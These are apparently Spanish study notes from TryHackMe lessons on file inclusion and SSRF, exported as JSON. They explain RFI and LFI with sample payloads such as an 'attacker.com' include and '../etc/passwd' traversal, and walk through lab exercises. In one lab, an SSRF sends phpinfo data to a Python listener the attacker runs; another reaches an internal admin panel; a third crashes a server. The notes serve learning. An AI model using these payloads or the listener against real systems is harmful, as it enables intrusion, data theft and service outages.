[
  {
    "title": "2. File Inclusion Types",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/2-file-inclusion-types/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/2. File Inclusion Types.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Fundamentos de la Inclusión de Archivos</h2>\nUna string de traversal, comúnmente vista como `../` se usa en ataques de path traversal para navegar entre la estructura de directorios de un sistema de ficheros. Se usan para acceder a archivos fuera del directorio pretendido.\n\nLa ruta relativa se refiere a localizar archivos basándonos en el directorio actual. Por ejemplo `include('./folder/file.php')` implica que `file.php` está en un directorio llamado `folder`, que está en el mismo directorio que el script en ejecución.\n\nLa ruta absoluta implica especificar la ruta completa desde el directorio `/`. Por ejemplo, `/var/www/html/folder/file.php`.\n\n---------------------------------------------\n<h2>Remote File Inclusion</h2>\nLa inclusión de archivos remotos, o RFI, es una vulnerabilidad que permite a los atacantes incluir archivos remotos, normalmente mediante manipulación de input. Esto puede llevar a ejecución de scripts o código maliciosos en el servidor.\n\nTípicamente, RFI ocurre en aplicaciones que incluyen contenido externo de forma dinámica. Los atacantes pueden manipular parámetros en una petición para apuntar a archivos externos maliciosos. Por ejemplo, si una aplicación web usa una URL en un parámetro GET como `include.php?page=http://attacker.com/exploit.php`, un atacante podría reemplazar la URL con la ruta a un script malicioso.\n\n----------------------------------------------\n<h2>Local File Inclusion</h2>\nLa inclusión de archivos locales, o LFI, ocurre cuando un atacante explota un campo de input vulnerable para acceder o ejecutar archivos en el servidor. Los atacantes normalmente explotan campos de input poco sanitizados para manipular rutas, intentando acceder a archivos fuera del directorio pretendido. Por ejemplo, usando una string de path traversal, un atacante puede acceder a archivos sensibles como `include.php?page=../../../../etc/passwd`.\n\nAunque LFI suele llevar a acceso no autorizado a archivos, puede escalar a RCE. Esto puede ocurrir si un atacante puede subir o inyectar código en un archivo que luego se incluye o se ejecuta. Técnicas como log poisoning, que significa inyectar código en los archivos de registro y luego incluir esos archivos, son ejemplos de como LFI puede llevar a RCE.\n\n-------------------------------------\n<h2>RFI vs LFI (Proceso de Explotación)</h2>\n![[Pasted image 20260124160248.png]]\n\nEste diagrama diferencia el proceso de explotar vulnerabilidades RFI y LFI. En RFI, el foco está en incluir y ejecutar archivos remotos, mientras que en LFI, el atacante intenta acceder a archivos locales y potencialmente usar esto para acceder a ejecutar código en el servidor.",
    "modified": "2026-01-25T01:01:15"
  },
  {
    "title": "1. Web Application Architecture",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/1-web-application-architecture/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/1. Web Application Architecture.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Estructura de una Aplicación Web</h2>\nLas aplicaciones web son sistemas complejos que comprenden varios componentes que trabajan juntos para repartir una buena experiencia de usuario. En su núcleo. una aplicación web tiene dos partes principales: el frontend y el backend.\n\n1. **Frontend:** Esta es la interfaz de usuario de la aplicación, típicamente construida usando frameworks como React, Angular o Vue.js. Se comunica con el backend vía APIs.\n2. **Backend:** Este componente del servidor procesa las peticiones del usuario, interactúa con las bases de datos y sirve información al frontend. Se suele desarrollar usando lenguajes como PHP, Python y JavaScript y frameworks como Node.js, Django o Laravel.\n\nUno de los aspectos fundamentales de las aplicaciones web es el modelo cliente-servidor. En este modelo, el cliente manda una petición al servidor. El backend lo procesa y manda una respuesta. El cliente y la comunicación del servidor suele pasar a través de protocolos HTTP/HTTPS.\n\n![[Pasted image 20260124131237.png]]\n\n----------------------------------------\n<h2>Server-Side Scripting y Manejo de Archivos</h2>\nLos scripts del lado del servidor corren en el servidor y generan el contenido del frontend, el cual se manda al cliente. A contrario que los scripts del lado del cliente como JavaScript en el navegador, los scripts del lado del servidor pueden acceder al sistema de ficheros y bases de datos del servidor.\n\nEl manejo de archivos es una parte importante del server-side scripting. Las aplicaciones web suelen necesitar leer o escribir archivos del servidor. Por ejemplo, leer archivos de configuración, guardar archivos subidos del usuario o incluir código de otros archivos.\n\nPor ejemplo, la aplicación de abajo incluye un archivo basado en el input del usuario.\n\n![[Pasted image 20260124131938.png]]\n\nSi este input no es correctamente validado y sanitizado, un atacante puede explotar el parámetro vulnerable para incluir archivos maliciosos o acceder a archivos sensibles en el servidor. En este caso, el atacante podría ver los contenidos del archivo `/etc/passwd`.\n\n![[Pasted image 20260124132045.png]]",
    "modified": "2026-01-25T01:01:15"
  },
  {
    "title": "5. Types of SSRF - Blind",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/5-types-of-ssrf-blind/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/5. Types of SSRF - Blind.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "La SSRF blind se refiere a un escenario donde el atacante puede mandar peticiones al servidor objetivo pero no recibe una respuesta directa o feedback sobre el resultado de sus peticiones.  Este tipo de SSRF puede ser más difícil de explotar debido a que el atacante no ve directamente el resultado de sus acciones.\n\n-----------------------------------------------\n<h2>Blind SSRF con Out-Of-Band</h2>\nLa SSRF OOB es una técnica dnde el atacante usa diferentes canales de comunicación en lugar de recibir respuestas por el mismo canal.\n\nPor ejemplo, el atacante puede manipular el servidor vulnerable para hacer una petición DNS a un domminio controlado por él. Esta interacción externa ofrece al atacante evidencia de que una vulnerabilidad SSRF existe y potencialmente le permite recolectar información como IPs internas y estructura de red.\n\n<h4>Cómo Funciona</h4>\n- Una vez más, inicia sesión en el dashboar en la pestaña `Profile`. Veremos que nos redirige a `http://hrms.thm/profile.php?url=localhost/getInfo.php`, lo que muestra un mensaje de que la información se está mandando.\n  ![[Pasted image 20260123112505.png]]\n- ¿Qué está pasando aquí? Una vez que cargamos `profile.php`, manda la información a una página externa llamada `getInfo.php`, lo que es probablemente usado para analíticas o registros.\n\n```php\n<?php\n...\n$targetUrl = $_GET['url'];\nob_start();\nob_start();\nphpinfo();\n$phpInfoData = ob_get_clean();\n$ch = curl_init($targetUrl); \ncurl_setopt($ch, CURLOPT_POST, 1);\ncurl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$response = curl_exec($ch); \n...\n?>\n```\n\n- El análisis del código fuente de la página muestra que está leyendo parámetros `url` y sin realizar ninguna validación, manda la información al servidor mencionado en el parámetro de la URL.\n- Aquí, el atacante puede redirigir la petición a su servidor, consiguiendo así información adicional para la explotación.\n- En tu máquina, cera un nuevo archivo llamado `server.py` y añade el siguiente código:\n\n```python\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\nfrom urllib.parse import unquote\nclass CustomRequestHandler(SimpleHTTPRequestHandler):\n\n    def end_headers(self):\n        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin\n        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')\n        self.send_header('Access-Control-Allow-Headers', 'Content-Type')\n        super().end_headers()\n\n    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'Hello, GET request!')\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length).decode('utf-8')\n\n        self.send_response(200)\n        self.end_headers()\n\n        # Log the POST data to data.html\n        with open('data.html', 'a') as file:\n            file.write(post_data + '\\n')\n        response = f'THM, POST request! Received data: {post_data}'\n        self.wfile.write(response.encode('utf-8'))\n\nif __name__ == '__main__':\n    server_address = ('', 8080)\n    httpd = HTTPServer(server_address, CustomRequestHandler)\n    print('Server running on http://localhost:8080/')\n    httpd.serve_forever()\n```\n\n- El código de arriba recibirá todo el contenido y lo guardará en `data.html` en el servidor. Para obtener la información, necesitamos arrancar un servidor ligero. Podemos hacerlo con: `sudo chmod +x server.py && sudo python3 server.py`.\n- Ahora abre el navegador y ve a `http://hrms.thm/profile.php?url=http://IP:8000`, lo que registrará la información en `data.html`. Abre el archivo `data.html` que contiene la información del servidor que usaremos para ataques futuros.\n\n![[Pasted image 20260123113739.png]]\n\n--------------------------------------------\n<h2>Semi-Blind SSRF (Basada en Tiempo)</h2>\nLa SSRF time-based es una variación de SSRF donde el atacante usa peticiones relacionadas con tiempo para inferir el éxito o fracaso de la petición maliciosa. Observando cómo de largo se toma para responder podemos concluir si nuestras peticiones son correctas o no.",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "4. Types of SSRF - Basic - continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/4-types-of-ssrf-basic-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/4. Types of SSRF - Basic - continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "En esta tarea vamos a continuar aprendiendo sobre técnicas básicas de SSRF.\n\n----------------------------------------\n<h2>Escenario 2: Acceder a un Servidor Interno</h2>\nEn aplicaciones web complejas, es común para las aplicaciones front-end interactuar con servidores back-end internos. Estos servidores suelen estar hosteados en direcciones IP no ruteables, por lo que un usuario de internet no puede acceder a ellos. En este contexto, un atacante explota la validación del input vulnerable de la web para engañar al servidor para que mande peticiones internas a recursos en la misma red.\n\nPor ejemplo, si un servidor interno ofrece manejo de base de datos o controles administrativos, el atacante podría construir una URL que inicie una acción no deseada en estos sistemas internos. Técnicamente se consigue a través de input manipulado, como direcciones IP especiales (como `192.168.x.x` o `10.x.x.x` para IPv4) o nombres de dominio (por ejemplo `internal-database.hrms.thm`).\n\nAdemás, como estos servidores internos pueden estar faltos del mismo nivel de seguridad y monitorización que los servidores externos, dicha explotación puede no ser vista. El atacante puede usar también este método para realizar reconocimiento en la red interna, identificando otros objetivos o sistemas vulnerables.\n\n<h4>Cómo Funciona</h4>\n- En este caso, trataremos de acceder a recursos internos inaccesibles a través de peticiones directas.\n- Ahora que hemos adquirido las credenciales del panel de login, vamos a iniciar sesión en la dashboard.\n- Una vez logueados en la app HRMS, veremos un dashboard que lista empleados y sus departamentos. Hay un menú que muestra los datos de los empleados y su salario.\n  ![[Pasted image 20260122222157.png]]\n- Desde el archivo de configuración, podemos ver que el panel de admin está hosteado en `http://192.168.2.10/admin.php`. Si intentamos loguearnos no es accesible directamente.\n  ![[Pasted image 20260122222313.png]]\n- No tenemos ruta a esa IP ya que forma parte de una red privada y sólo puede ser accedida por una máquina en la misma red.\n- Si comprobamos el código fuente de HTML, muestra que el menú toma la URL de un sistema interno y renderiza la información. Los detalles de toos los empleados se trasfieren de `http://192.168.2.10/employees.php`.\n  ![[Pasted image 20260123100445.png]]\n- Vale, vemos que el menú desplegable accede a un sistema interno. ¿Qué pasa si intentamos cambiar la petición de tal forma que en vez de cargar la página de empleados mandamos `http://192.168.2.10/admin.php`?\n  ![[Pasted image 20260123100610.png]]\n- Una vez actualizado el valor, elegimos `Salary` del menú desplegable `Select Category`.\n  ![[Pasted image 20260123100824.png]]\n- Ahí lo tenemos, el panel que antes era inaccesible.\n  ![[Pasted image 20260123100844.png]]",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "6. A Classic Example - Crashing the Server",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/6-a-classic-example-crashing-the-server/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/6. A Classic Example - Crashing the Server.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "Un atacante podría abusar SSRF crasheando el servidor o creando una DoS a otros hosts. Hay muchas instancias ([WordPress](https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/), [CairoSVG](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv)) donde los atacantes cortan la disponibilidad de un sistema lanzando ataques SSRF.\n\n-----------------------------------------\n<h2>Crasheando el Servidor</h2>\nEn esta demostración SSRF vamos a ilustrar cómo un atacante puede explotar una aplicación web para causar una denegación de servicio en el servidor. En nuestro escenario, la vulnerabilidad se explota dando una URL maliciosa que apunta al recurso que al ser accedido por el servidor,  lleva a un consumo de recursos excesivos o dispara un crasheo.\n\nPor ejemplo, el atacante puede introducir una URL que apunta a un gran archivo en un servidor lento o servicio que responde con una carga abrumadora de información. Cuando la aplicación vulnerable accede a esta URL, entra en una acción que consume todos sus recursos, conllevando lentitud o crash.\n\n<h4>Cómo Funciona</h4>\n- Una vez que nos logueamos en la dashboard, veremos una pestaña llamada `Training` en la barra de navegación, que es usada para cargar el contenido de entrenamiento para los empleados.\n- Una vez que clickemos en esa pestaña, veremos que nos redirigue a `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`.\n  ![[Pasted image 20260123122051.png]]\n- Notamos que el archivo `url.php` está cargando contenido externo mostrado aquí. ¿Qué pasa si intentamos cargar otro contenido?\n- Intenta abrir el archivo `http://hrms.thm/url.php?id=10.10.10.10`.\n  ![[Pasted image 20260123122153.png]]\n- Ahora que sabemos que el servidor es vulnerable a SSRF básica, exploremos el código de `url.php` para hacer que crashee el servidor.\n- Una vez que accedemos a la URL `http://hrms/?url=localhost/url`, veremos el siguiente código en el footer (sólo funciona si el usuario no está logueado).\n\n```php\n<?php\n....\n....\n    if ($imageSize < 100) {\n\t\t  // Output the image if it's within the size limit\n    \n\t\t$base64Image = downloadAndEncodeImage($imageUrl);\n        echo '<img src=\"' . htmlspecialchars($base64Image) . '\" alt=\"Image\" style=\"width: 100%; height: 100%; object-fit: cover;\">';\n\n    } else {\n\t \t// Memory Outage - server will crash\n    \n....\n...\n```\n\n- El código de arriba muestra que `url.php` carga una imagen. Si el tamaño de la imagen supera los `100KB`, muestra un mensaje de falta de memoria.\n- Trataremos de crashear el servidor cargando una imagen mayor que `100KB`. Para tu conveniencia, ya hemos puesto esa imagen en `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.\n  ![[Pasted image 20260123123501.png]]",
    "modified": "2026-01-24T00:53:46"
  }
]